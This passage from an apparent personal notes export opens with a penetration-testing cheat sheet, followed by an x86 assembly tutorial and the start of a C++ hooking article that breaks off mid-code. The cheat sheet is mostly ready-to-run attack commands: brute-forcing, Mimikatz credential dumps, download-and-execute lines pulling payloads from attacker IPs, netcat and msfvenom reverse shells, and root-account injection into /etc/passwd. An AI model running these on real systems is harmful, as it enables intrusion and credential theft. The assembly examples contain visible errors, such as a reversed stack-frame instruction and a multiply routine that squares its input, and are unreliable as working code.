&quot;[IP]&quot; 3128\n \n# /etc/proxychains with credentials\nhttp &quot;[IP]&quot; 3128 &quot;[USERNAME]&quot; &quot;[PASSWORD]&quot;\nSpose Commands:\n\nSpose\n\npython spose.py --proxy &quot;http://[IP]:3128&quot; --target &quot;[IP]&quot;\nVoIP - 5060\nResources:\n\nPentesting VoIP\nSippts\n\nCommands:\npython3 sipdigestleak.py -i &quot;[TARGET-IP]&quot;\nDecoding Raw File:\n# The `8000` is the 8000 HZ\nsox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav\ngRPC - 50051\n# Interacting through CLI\ngrpcurl --plaintext &quot;[URL]:[PORT]&quot;\n \n# Interacting through GUI\n./grpcui --plaintext &quot;[IP]:[PORT]&quot;\nBrute-Force\nHydra\n# SSH\nhydra -L usernames.txt -P passwords.txt &quot;ssh://[IP]&quot;\n \n# RDP\nhydra -L usernames.tct -P passwords.txt &quot;rdp://[IP]&quot;\n \n# WEB POST\nhydra -L usernames.txt -P &quot;/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt&quot; &quot;[IP]&quot; http-post-form &quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;\n \n# WEB GET\nsudo hydra -l user -P &quot;/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt&quot; &quot;[IP]&quot; http-get &quot;/&quot;\nCrackMapExec\n# SMB\ncme smb &quot;[IP]&quot; -u &quot;[USERNAME-LIST]&quot; -p &quot;[PASSWORD-LIST]&quot; --continue-on-success\n \n# SMB List Shares\ncme smb &quot;[IP]&quot; -u &quot;[USERNAME-LIST]&quot; -p &quot;[PASSWORD-LIST]&quot; --shares\n \n# RDP\ncme smb &quot;[IP]&quot; -u &quot;[USERNAME-LIST]&quot; -p &quot;[PASSWORD-LIST]&quot; --continue-on-success -M rdp -o ACTION=&#039;enable&#039;\n \n# SSH\ncme ssh &quot;[IP]&quot; -u &quot;[USERNAME-LIST]&quot; -p &quot;[PASSWORD-LIST]&quot; --continue-on-success\nEvil-WinRM\nCommands:\n# Credentials\nevil-winrm -i &quot;[IP]&quot; -u &quot;[USERNAME]&quot; -p &quot;[PASSWORD]&quot;\n \n# Hash\nevil-winrm -i &quot;[IP]&quot; -u &quot;[USERNAME]&quot; -H &quot;[HASH]&quot;\n \n# Evil-winrm &amp; Mimikatz\n.\\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;\nExploit\nCommands:\nsudo ifconfig tun0 mtu 750 \nExploit Websites:\n\nPacketStormSecurity\nExploitDB\n\nAlways change the:\n\nIP-Address\nPort Number\nDirectory\n\nFile Transfer\nPowerShell Command:\n# Instantly executing powershell script\nIEX(New-Object Net.WebClient).Download(&quot;http://10.10.16.11/Sherlock.ps1&quot;);Invoke-Sherlock\nCertutils Command:\ncertutil.exe -urlcache -split -f http://10.10.16.11/reverse-shell-1.php reverse-shell-1.php\nSMB File Execute:\ncmd.exe /c //192.168.45.246/temp/nc.exe -e cmd.exe 192.168.45.246 80\nFile Upload One-liner:\n# Create directory\nmkdir &quot;/var/www/html/uploads&quot;\n \n# Create a `upload.php` file\necho &#039;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Upload your files&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;upload.php&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Upload your file&lt;/p&gt; &lt;input type=&quot;file&quot; name=&quot;uploaded_file&quot;&gt;&lt;/input&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/input&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?PHP if(!empty($_FILES[&quot;uploaded_file&quot;])) { $path = &quot;/&quot;; $path = $path . basename( $_FILES[&quot;uploaded_file&quot;][&quot;name&quot;]); if(move_uploaded_file($_FILES[&quot;uploaded_file&quot;][&quot;tmp_name&quot;], $path)) { echo &quot;The file &quot;.  basename( $_FILES[&quot;uploaded_file&quot;][&quot;name&quot;]). &quot; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } } ?&gt;&#039; &gt; /var/www/html/upload.php\nLinux Python HTTP Server:\npython3 -m http.server 80\nWindows Simple HTTP Server:\n\nSimpe-HTTP-Server\n\n.\\simple-http-server.exe\nSMBServer:\n# Start Server\nimpacket-smbserver smbfolder $(pwd) -smb2support -user offsec -password offsec\n \n# Transfer files\ncopy &quot;[FILE-NAME]&quot; \\\\IP\\\\smbfolder\nTunneling\nSSH\nLocal Port Forwarding:\nssh -N -L &quot;0.0.0.0:[LOCAL-PORT]:[TARGET-IP]:[TARGET-PORT]&quot; &quot;[USERNAME]@[IP]&quot;\nDynamic Port Forwarding:\n# SSH Command\nssh -N -D &quot;0.0.0.0:1080&quot; &quot;[USERNAME]@[IP]&quot;\n \n# Add &quot;socks5 127.0.0.1 1080&quot; into &quot;/etc/proxychains4.conf&quot;\nsocks5 &quot;127.0.0.1&quot; &quot;1080&quot;\n \n# Example command\nproxychain -q nmap &quot;[IP]&quot;\nRemote Port Forwarding:\n# Start SSH\nsudo systemctl start ssh\n \n# SSH Command\nssh -N -R &quot;127.0.0.1:[LOCAL-PORT]:[TARGET-IP]:[TARGET-PORT]&quot; &quot;kali@[LOCAL-IP]&quot;\nRemote Dynamic Port Forwarding:\n# Start SSH Service\nsudo systemctl start ssh\n \n# SSH Command\nssh -N -R 1080 kali@192.168.118.4\n \n# Add &quot;socks5 127.0.0.1 1808&quot; into &quot;/etc/proxychains4.conf&quot;\nsocks5 &quot;127.0.0.1&quot; &quot;1080&quot;\n \n# Execute commands use &quot;proxychains&quot;\nproxychains -q nmap --top-ports 1080 &quot;[IP]&quot; \nChisel\nLocal Port Forwarding:\n#Chisel Server (LOCAL-MACHINE)\nchisel server --port 8080 --reverse --socks5\n \n# Chisel Client (TARGET-MACHINE)\nchisel client &quot;[LOCAL-IP]:[LOCAL-PORT]&quot; R:[LOCAL-PORT-TO-FORWARD]:[TARGET-IP]:[TARGET-PORT]\nDynamic Port Forwarding:\n# Chisel Server (LOCAL-MACHINE)\nchisel server --port 8080 --reverse --socks5\n \n# Chisel Client (TARGET-MACHINE)\n.\\chisel.exe client &quot;[LOCAL-IP]:[LOCAL-PORT]&quot; R:1080:socks\nLinux Privilege Escalation\nCredentials\nEnumeration:\n\nEnumerate through users table on MySQL.\nEnumerate through files such as config.php.\n\nCredentials Re-use:\n\n[USERNAME]:[USERNAME]\n\nCommands\n# Spawn a shell\npython -c &#039;import pty;pty.spawn(&quot;/bin/bash&quot;)&#039;\npython3 -c &#039;import pty;pty.spawn(&quot;/bin/bash&quot;)&#039;\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/usr/games:/tmp\nexport TERM=xterm-256color\nalias ll=&#039;ls -lsaht --color=auto&#039;\nstty raw-echo;fg;reset\nstty columns 200 rows 200\n \n# Overview of user\nid\ngroups\n \n# Hostname\nhostname\n \n# Kernel\nuname -a\n \n# Sudo permissions\nsudo -l\nsudo -i\n \n# Which commands\nwhich gcc\nwhich cc\nwhich python\nwhich perl\nwhich wget\nwhich curl\nwhich fetch\nwhich nc\nwhich mcat\nwhich nc.traditional\nwhich socat\n \n# Process information\ncat &quot;/proc/version&quot;\n \n# Operating system\nfile /bin/bash\ncat &quot;/proc/issue&quot;\ncat &quot;/etc/*-release&quot;\n \n# Kernel Drivers\nlsmod\n \n# Information about specific driver\n/sbin/modinfo libata\n \n# Running Processes\nps -aux\n \n# Environment variables\nenv\n \n# Lists SUDO commands\nsudo -l\n \n# See all users (potentially brute-force attack)\ncat &quot;/etc/passwd&quot;\n \n# Is anything vulnerable running as root\nps aux | grep -i &#039;root&#039; --color=auto\n \n# See users SSH Keys\ncat &quot;/home/[USER]/.ssh/id_rsa&quot;\ncat &quot;/home/[USER]/.ssh/id_rsa.pub&quot;\n \n# Lists entered commands\nhistory\n \n# Network interface informations\nifconfig\nnetstat -antup\nnetstat -tunlp\n \n# Writable folders\nfind / -writable -type d 2&gt;/dev/null\n \n# Searching for SUID\nfind / -perm -u=s -type f 2&gt;/dev/null\n \n# Searching for GUID\nfind / -perm -g=s -type f 2&gt;/dev/null\n \n# Searching for config directories\nfind / -type d -name config 2&gt;/dev/null\n \n# Searching for config.txt file\nfind / -type f -name config.txt 2&gt;/dev/null\n \n# Quick look at:\nls -lsaht /opt/\nls -lsaht /tmp/\nls -lsaht /var/tmp\nls -lsaht /dev/shm/\nls -lsaht /var/mail\n \n# NFS Permissions?\ncat /etc/exports\n \n# Capabilities Privilege Escalation\ngetcap\ngetcap -r / 2&gt;/dev/null\n \n# Cronjobs\ncat &quot;/etc/crontab&quot;\ncat &quot;/var/log/cron.log&quot;\ngrep &quot;CRON&quot; &quot;/var/log/syslog&quot;\ncrontab -u root -l\n \n# Mounted filesystems\ncat &quot;/etc/fstab&quot;\n \n# Available disks\nlsblk\nChange Password\n# Generate openssl hash\nopenssl passwd root\n \n# Assign hash to root user\necho &quot;root2:[HASH]:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd\nPath Variables\necho $PATH\nPATH=/tmp:$PATH\nnano &quot;/tmp/[PAYLOAD]&quot;\n \n# Payload\necho &quot;#!/bin/bash&quot; &gt; &quot;[EXECUTABLE-NAME]&quot;\necho &quot;chmod -R 7777 /bin/bash&quot;\nNFS\ncat &quot;/etc/exports&quot; # no_root_squares enabled allows us to create root files\nshowmount -e &quot;[IP]&quot;\nmount -o rw &quot;[TARGET-IP]:[DIR]&quot; &quot;[MOUNT-DIR]&quot;\nGroups\nDisk Group:\ndebug fs /dev/sda2\nReboot Privilege Escalation:\n# Searching for writeable services\nfind / -writable -name &quot;*.service&quot; 2&gt;/dev/null\n \n# Inserting payload into the service\necho &quot;[Unit]&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\necho &quot;Description=Zeno monitoring&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\n \necho &quot;[Service]&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\necho &quot;Type=simple&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\necho &quot;User=root&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\necho &quot;ExecStart=/bin/bash -c &#039;chmod -R 7777 /bin/bash&#039;&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\n \necho &quot;[Install]&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\necho &quot;WantedBy=multi-user.target&quot; &gt;&gt; &quot;[SERVICE-LOCATION]&quot;\n \n# Restart machine\nsudo /usr/sbin/reboot\nExiftool\n\nCVE-2021-22204\n\n# Installing extension\nsudo apt-get install djuvlibre\n \n# Creating malicious `.jpeg` file\npython3 ./-CVE-2021-22204.py -c &lt;command&gt; [-i &lt;image.jpg&gt;]\nResources:\n\nExploitNotes\nGTFOBins\niNotes\nS1REN Blog\n\nWindows Privilege Escalation\nLdapsearch\nldapsearch -x -h 192.168.194.165 -b &quot;dc=heist,dc=offsec&quot;\nWindows Old Backup\n\nC:\\Windows.old\\system32\\config\\SAM\nC\\Windows.old\\system32\\config\\SYSTEM\nC:\\Windows\\Repair\\SAM\nC:\\Windows\\Repair\\SYSTEM\n\n# Extracting SAM &amp; SYSTEM\npypykatz registry --sam SAM SYSTEM\n \n# VSSAdmin Dump\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM c:\\\n \ncopy \\\\.\\GLOBALROOT\\SystemRoot\\Windows\\NTDS\\NTDS.dit c:\\users\\enox\\Downloads\\\ncopy \\\\.\\GLOBALROOT\\SystemRoot\\System32\\config\\SYSTEM c:\\users\\enox\\Downloads\\\n \n# VSSAdmin: impacket\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM local\nCommands\n# Show User\nwhoami\n \n# Show groups\nwhoami /groups\n \n# Show privileges\nwhoami /priv\n \n# Show alls everything\nwhoami /all\n \n# CMD: List users\nnet user\nnet user /domain\n \n# CMD: List groups\nnet localgroup\nnet group /domain\n \n# Powershell: List users\nGet-LocalUser\n \n# Powershell: List groups\nGet-LocalGroup\nGet-LocalGroupMember Administrators\n \n# System information\nsysteminfo\n \n# Network interface\nipconfig /all\n \n# Network routes\nroute print\n \n# Scheduled tasks\nschtasks /query /fo list /v\n \n# Active network connections\nnetstat -ano\n \n# Firewall information\nnetsh firewall show state\nnetsh firewall show config\n \n# Powershell History\nGet-History \n(Get-PSReadlineOption).HistorySavePath\n \n# Cleartext Passwords in files\nfindstr /si password *.txt\nfindstr /si password *.xml\nfindstr /si password *.ini\nfindstr /spin &quot;password&quot; .\n \n# 32-bit applications\nGet-ItemProperty &quot;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | select displayname\n \n# 64-bit applications\nGet-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | select displayname\n \n# Running processes\nGet-Process\n \n# Finding `.txt` documents\nGet-ChildItem -Path &quot;C:\\Users&quot; -Include *.txt -File -Recurse -ErrorAction SilentlyContinue\n \n# Finding `.ini` documents\nGet-ChildItem -Path &quot;C:\\Users&quot; -Include *.ini -File -Recurse -ErrorAction SilentlyContinue\n \n# Finding `all` documents\nGet-ChildItem -Path &quot;C:\\Users&quot; -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue\n \n# Run CMD as other users\nrunas /user:[NAME] cmd\nSeRestorePrivilege\n\nEnableSeRestorePrivilege.ps1\n\n# Enables the privilege\nImport-Module .\\EnableSeRestorePrivilege.ps1\n \n# Go to system32 directory\ncd C:\\Windows\\System32\n \n# Change the following...\nmv utilman.exe utilman.old\nmv cmd.exe utilman.exe\n \n# RDP to machine\nrdesktop &quot;[IP]&quot;\nSeBackupPrivilege\nmkdir temp\nreg save hklm\\sam c:\\temp\\sam\nreg save hklm\\system c:\\temp\\system\npypykatz registry --sam sam system\nSeImpoersonatePrivilege &amp; SeAssignPrimaryToken\n\nJuicyPotatoNG\n\n# JuicyPotatoNG\n.\\JuicyPotatoNG -p c:\\windows\\system32\\cmd.exe -a &quot;/c c:\\JavaTemp\\nc.exe -e cmd.exe [LHOST] [LPORT]&quot; -t *\n \n# PrintSpoofer\n.\\PrintSpoofer64.exe -i -c powershell\n \n# SweetPotato\n.\\RottenPotato.exe -p cmd.exe -e EfsRpc\nSeManageVolume\n\nSeManageVolumeExploit\n\n# Location: /ctf/tools/privilege-escalation\n.\\SeManageVolumeExploit.exe\n \n# Payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o Printconfig.dll\n \n# Transfer `Printconfig.dll` onto machine and execute the following commands\ncopy Printconfig.dll C:\\Windows\\System32\\spool\\drivers\\x64\\3\\\n$type = [Type]::GetTypeFromCLSID(&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;)\n$object = [Activator]::CreateInstance($type)\nGMSAPasswordReader\n\nToolies\n\n.\\GMSAPasswordReader.exe --accountname &#039;[NAME]&#039;\nService Binary Hijacking\n# Payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 -f exe -o shell.exe\n \n# Checks if a service has insecure permissions\n.\\accesschk.exe /accepteula -uwcqv &quot;[USER]&quot; *\n \n# Displays additional information about the service\nsc qc &quot;[APP-NAME]&quot;\n \n# Changes `BINARY_PATH_NAME` to our reverse shell\nsc config daclsvc binpath= &quot;\\&quot;C:\\PrivEsc\\shell.exe\\&quot;&quot;\n \n# Checks the permission of `filepermservice.exe`\n.\\accesschk.exe /accepteula -quvw &quot;C:\\Program Files\\File Permissions Service\\filepermservice.exe&quot;\n \n# Start Service\nnet start &quot;[APP-NAME]&quot;\n \n# Stop Service\nnet stop &quot;[APP-NAME]&quot;\n \n# Start Service\nsc.exe start &quot;[APP-NAME]&quot;\n \n# Stop Service\nsc.exe stop &quot;[APP-NAME]&quot;\nWeak Registry Permissions\n# Searching for weak registry permissions\n.\\accesschk.exe /accepteula -uvwqk &quot;HKLM\\System\\CurrentControlSet\\Services\\regsvc&quot;\n \n# Replacing the weak registry permission to payload\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\shell.exe /f\n \n# Start Service\nnet start &quot;[APP-NAME]&quot;\n \n# Stop Service\nnet stop &quot;[APP-NAME]&quot;\nRegistry Auto-run\n# Searching for weak autorun registry\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n \n# Checking the permission of `[APP-LOCATION]`\nC:\\PrivEsc\\accesschk.exe /accepteula -wvu &quot;[APP-LOCATION]&quot;\n \n# Replacing `program.exe` with `shell.exe` exexutable\ncopy C:\\PrivEsc\\shell.exe &quot;C:\\Program Files\\Autorun Program\\program.exe&quot;\nRegistry AlwaysInstallElevated\n# Querying the registry AlwaysInstallElevated keys\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n \n# Creating Payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f msi -o reverse.msi\n \n# Executing MSI file on target\nmsiexec /quiet /qn /i &quot;C:\\PrivEsc\\shell.msi&quot;\nSaved Credentials\n# Lists all saved credentials\ncmdkey /list\n \n# Runs it as administrator since the creds were saved\nrunas /savecred /user:admin &quot;C:\\shell.exe&quot;\nStartup Apps\n# Checking if the user can write to StartUp\n.\\accesschk.exe /accepteula -d &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp&quot;\n \n# CreateShortcut.VBS\nSet oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)\nsLinkFile = &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\reverse.lnk&quot;\nSet oLink = oWS.CreateShortcut(sLinkFile)\noLink.TargetPath = &quot;C:\\PrivEsc\\shell.exe&quot;\noLink.Save\n \n# Executes the script above\ncscript C:\\PrivEsc\\CreateShortcut.vbs\nWindows Post Exploitation\nMimikatz Dumping Cached Credentials:\n# Mimikatz\ntoken::elevate\nlsadump::sam\nlsadump::secrets\nsekurlsa::logonpasswords\n \n# Evil-winrm + Mimikatz\n.\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::sam&quot; &quot;lsadump::tickets&quot; &quot;exit&quot;\nOther commands:\n# SYSTEM &amp; SAM: impacket\nimpacket-secretsdump -just-dc-user &quot;[DOMAIN-ADMIN-USERNAME]&quot; &quot;[DOMAIN-NAME]:[USERNAME]:[PASSWORD]@[TARGET-IP]&quot;\n \n# AS-REP Roasting: impacket\nimpacket-GetNPUsers -dc-ip &quot;[IP]&quot; -request -outputfile hashes.asreproast &quot;[DOMAIN]/[USERNAME]&quot;\n \n# Kerberoast: impacket\nimpacket-GetUserSPNs -request -dc-ip &quot;[TARGET-IP]&quot; &quot;[DOMAIN]/[USERNAME]&quot;\n \n# ASP-REP Roasting: Rubeus\n.\\Rubeus.exe asreproast /nowrap\n \n# ASP-REP Roasting: Rubeus\n.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"},"Documents/0001-The-Basics-of-x86-Assembly":{"slug":"Documents/0001-The-Basics-of-x86-Assembly","filePath":"Documents/0001 The Basics of x86 Assembly.md","title":"The Basics of Intel x86 Assembly","links":[],"tags":[],"content":"Introduction\nI’m developing an product which requires me to have fairly good understanding about x86 assembly. While setting up my Netwide Assembler on Windows I encountered numerous challenges since there were not many resources for setting it up on Windows. What is Netwide Assembler? It’s an assembler and disassembler for Intel x86 architecture which can be used for writing assembly code.\nIn his blog post I will go through the process of setting up Netwide Assembler on Windows and provide informations about x86 assembly to help you get started with programming in x86 assembly.\nInstalling NASM\n\nInstall Netwide Assembler from the following link: nasm.us\nOpen System Properties\nSelect Environment Variables\nSelect Path and click on Edit\nAdd C:\\Users\\[USERNAME]\\AppData\\Local\\bin\\NASM\nSave and Exit\n\nInstalling MSYS2\n\nInstall MSYS2 from the following link: msys2.org\nLaunch MSYS2\nExecute the following command: pacman -S mingw-w64-x86_64-toolchain\nOpen System Properties\nSelect Environment Variables\nSelect Path and click on Edit\nAdd C:\\msys64\\mingw32\\bin\nSave and Exit\n\nCompile and Execute\nNow as Netwide Assembler and MSYS2 has been installed and properly configured we can compile and execute x86 assembly code.\nx86 Assemblyglobal  _main\nextern  _printf\n \nsection .data\n    message db &#039;Hello World&#039;, 0xA, 0\n \nsection .text\n    push    ebp\n    mov     esp, ebp\n \n    push    message\n    call    _printf\n    add     esp, 4\n \n    xor     eax, eax\n    ret\nTerminalPS C:\\Users\\husenjan &gt; nasm main.asm -f win32 -o main.o\nPS C:\\Users\\husenjan &gt; gcc main.obj -o main.exe\nThe nasm command translates the x86 assembly code onto a object file and the gcc command compiles the object file to an executable program.\nBasics of Assembly x86\nThe extern instruction in x86 assembly is used to import C++ functions into x86 assembly environment.\nglobal  _main\nextern  _printf\n \n; Used for storing strings and variables\nsection .data\n    output      db      &#039;Hello World&#039;, 0\n \nsection .text\n_main:\n    ; Creating stack\n    push    ebp\n    mov     esp, ebp\n \n    ; Calling printf\n    push    output\n    call    _printf\n    add     esp, 4\n \n    ; Exiting program\n    xor     eax, eax\n    ret\nThe extern _printf is importing in printf() function in C++ and the call _printf is calling the printf() function. When calling a function in x86 assembly it’s critical to ensure the stack is being handled correctly before and after the function call otherwise it can create problems.\nWhile-loops can become necessary for our application incase certain actions needs to be executed multiple of times. In x86 assembly the while loop can be created using the stack, jump instruction, and comparison instruction.\nglobal  _main\nextern  _printf\n \n; Used for storing strings and variables\nsection .data\n    output      db      &#039;Hello World&#039;, 0xA, 0\n \nsection .text\n_main:\n    ; Creating stack\n    push    ebp\n    mov     esp, ebp\n \n    mov     eax, 0\n    ; Creating while-loop\n_while_loop:\n    push    eax\n \n    ; Calling printf\n    push    output\n    call    _printf\n    add     esp, 4\n \n    ; Incrementing eax\n    pop     eax\n    inc     eax\n \n    ; Exiting if EAX equals 10\n    cmp     eax, 10\n    jl      _while_loop\n \n    ; Exiting program\n    xor     eax, eax\n    ret\nIn push eax the EAX register is pushed onto the stack since once call _printf is executed the EAX register will be modified so once the function is called the pop eax is executed to restore the original value of EAX register and the value is incremented by one at inc eax and aslong the EAX register is less than 10 the _while_loop will continously be executed.\nWhile-loops are great but for-loops are even better because it’s much cleaner and it can easily be created using the stack and loop instruction. The loop instruction is essential since it will continue the loop to ECX register becomes null.\nglobal  _main\nextern  _printf\n \n; Used for storing strings and variables\nsection .data\n    output      db      &#039;Hello World&#039;, 0xA, 0\n \nsection .text\n_main:\n    ; Creating stack\n    push    ebp\n    mov     esp, ebp\n \n    ; Assigning ECX the value 10\n    mov     ecx, 10\n \n    ; Creating for-loop\n_for_loop:\n    push    ecx\n \n    ; Calling printf\n    push    output\n    call    _printf\n    add     esp, 4\n \n    ; Continues to jump to _for_loop if ECX is greater than 0\n    pop     ecx\n    loop    _for_loop\n \n    ; Exiting program\n    xor     eax, eax\n    ret\nThe mov ecx, 10 is assigning the value 10 to ECX register which means it will loop 10 times through _for_loop and each time the loop _for_loop is executed the ECX is decremented by 1 and this will continue to ECX register becomes null.\nNow as we have familiarized ourselves with while-loops and for-loops it’s time to start working with arrays. In x86 assembly a array can be created in .data section and a while-loop or for-loop can be used to work with the array.\nglobal  _main\nextern  _printf\n \n; Used for storing strings and variables\nsection .data\n    array           db      10  dup(0)\n    formatout       db      &#039;%d&#039;, 0xA, 0\n \nsection .text\n_main:\n    ; Creating stack\n    push    ebp\n    mov     ebp, esp\n    \n    mov     edi, 0\n    mov     ecx, 10\n    mov     ebx, 1\n \n    ; Looping through array\n_loop:\n    push    ecx\n    ; EAX = [array + edi]\n    mov     eax, [array + edi]\n    mov     eax, ebx\n    add     ebx, 1\n    push    ebx\n    \n    ; Calling _printf\n    push    eax\n    push    formatout\n    call    _printf\n    add     esp, 8\n \n    ; Restoring original values of registers\n    pop     ebx\n    pop     ecx\n \n    ; Preparing to access next array\n    add     edi, 2\n \n    ; Jumping to _loop if ECX is greater than 0\n    loop    _loop\n \n    xor     eax, eax\n    ret\nThe array db 10 dup(0) creates the array and the array can be accessed directly using mov eax, [array_name + edi] and once EDI register is incremented by 2 the next array is accessible.\nWhat next?\nProgramming in x86 assembly can be difficult and challenging in the beginning. However, the more practise that is done the easier it becomes therefore it’s highly recommended to start off slow such as programming a calculator using what has been taught in this blog post. If you don’t understand something than I recommend googling the question and researching it to you find the answer since that is the only way to learn difficult things.\nProgramming a calculator in x86 might seem simple but it’s extremely difficult. Here is an simple calculator which I worte in x86 assembly:\nglobal  _main\nextern  _printf\nextern  _scanf\nextern  _system\nextern  _sleep\n \nsection .data\n    cleaner         db          &#039;cls&#039;, 0\n    menu_01         db          &#039;-- CALCULATOR --&#039;, 0xA, 0\n    menu_02         db          &#039;1. Addition&#039;, 0xA, 0\n    menu_03         db          &#039;2. Substraction&#039;, 0xA, 0\n    menu_04         db          &#039;3. Multiply&#039;, 0xA, 0\n    menu_05         db          &#039;Select one: &#039;, 0\n    menu_06         db          &#039;Enter an number: &#039;, 0\n    menu_07         db          &#039;Enter another number: &#039;, 0\n    menu_08         db          &#039;%d + %d = %d&#039;, 0xA, 0\n    menu_09         db          &#039;%d - %d = %d&#039;, 0xA, 0\n    menu_10         db          &#039;%d * %d = %d&#039;, 0xA, 0\n    integer_01      dd          0\n    integer_02      dd          0\n    integer_03      dd          0\n    formatin_01     db          &#039;%d&#039;, 0\n \nsection .text\n_main:\n    push    ebp\n    mov     esp, ebp\n    \n    push    cleaner\n    call    _system\n    add     esp, 4\n \n    push    menu_01\n    call    _printf\n    add     esp, 4\n \n    push    menu_02\n    call    _printf\n    add     esp, 4\n \n    push    menu_03\n    call    _printf\n    add     esp, 4\n \n    push    menu_04\n    call    _printf\n    add     esp, 4\n \n    push    menu_05\n    call    _printf\n    add     esp, 4\n \n    push    integer_01\n    push    formatin_01\n    call    _scanf\n    add     esp, 8\n \n    push    menu_06\n    call    _printf\n    add     esp, 4\n \n    push    integer_02\n    push    formatin_01\n    call    _scanf\n    add     esp, 8\n \n    push    menu_07\n    call    _printf\n    add     esp, 4\n \n    push    integer_03\n    push    formatin_01\n    call    _scanf\n    add     esp, 8\n \n    mov     eax, dword[integer_01]\n \n    cmp     eax, 1\n    je      _addition\n \n    cmp     eax, 2\n    je      _subscration\n    \n    cmp     eax, 3\n    je      _multiply\n \n_addition:\n    mov     ebx, dword[integer_02]\n    mov     edx, dword[integer_03]\n \n    mov     eax, ebx\n    add     eax, edx\n \n    push    eax\n    push    edx\n    push    ebx\n    push    menu_08\n    call    _printf\n    add     esp, 16\n \n    jmp     _exit\n \n_subscration:\n    mov     ebx, dword[integer_02]\n    mov     edx, dword[integer_03]\n \n    mov     eax, ebx\n    sub     eax, edx\n \n    push    eax\n    push    edx\n    push    ebx\n    push    menu_09\n    call    _printf\n    add     esp, 16\n \n    jmp     _exit\n \n_multiply:\n    mov     ebx, dword[integer_02]\n    mov     edx, dword[integer_03]\n \n    mov     eax, dword[integer_02]\n    mul     eax\n \n    mov     edx, dword[integer_03]\n \n    push    eax\n    push    edx\n    push    ebx\n    push    menu_10\n    call    _printf\n    add     esp, 16\n \n    jmp     _exit\n \n_exit:\n    push    3\n    call    _sleep\n    add     esp, 4\n \n    jmp     _main\n \n    ret\nHopefully this blog post has been helpful teaching you about x86 assembly. I’ll try to update the blog post more once I’m more familiar with x86 assembly."},"Documents/0002-C++-Hooking-Methods":{"slug":"Documents/0002-C++-Hooking-Methods","filePath":"Documents/0002 C++ Hooking Methods.md","title":"C++ Hooking Methods","links":[],"tags":[],"content":"Introduction\nHooking in C++ is a technique that involves changing the program’s control flow by patching instruction bytes. Instead of executing the original function it will execute the hook function which is made by us. The technique is commonly used by anti-virus, malware’s, and sandboxes for either detection purpose or illegal purposes.\nDetour Hooking\nDetour Hooking Graph                                                                    +-----------------------+\n+------------------+       +--------+      +-----------------+      | MessageBoxA_Address:  |\n| call MessageBoxA |------&gt;| Hooked |-----&gt;| jmp MessageBoxA |-----&gt;| mov edi, edi          |\n+------------------+       +--------+ No   +-----------------+      | push ebp              |\n                                | Yes                               | mov esp, ebp          |\n                                |                                   | more...               |\n                                |                                   +-----------------------+\n                                v\n                     +------------------------+       +-----------------------------+\n                     | jmp Hooked_MessageBoxA |---+   | Hooked_MessageBoxA:         |\n                     +------------------------+   +--&gt;| push ebp                    |\n                                                      | mov ebp, esp                |\n                                                      | executes our custom code... |\n                                                      | ret                         |\n                                                      +-----------------------------+\nDetour Hooking is a technique that changes the jump instruction to jump to the hook function instead of the original function.\nDetour Hooking Functionbool detour_hook(void* source, void* destination, intptr_t length)\n{\n\t// Don&#039;t continue if length is less than 5\n\tif (length &lt; 5)\n\t{\n\t\treturn false;\n\t}\n\t\n\t// Will be used to store previous permission\n\tDWORD old_protect = NULL;\n\t\n\t// Calculating relative offset of destination\n\tDWORD relative_offset = ((DWORD)destination - (DWORD)source) - 5;\n\t\n\t// Changing permission of source\n\tVirtualProtect(source, length, PAGE_EXECUTE_READWRITE, &amp;old_protect);\n\t\n\t*(BYTE*)(source) = 0xE9; // The 0xE9 equals JMP\n\t*(DWORD*)((DWORD)source + 1) = relative_offset; // The relative_offset eqals 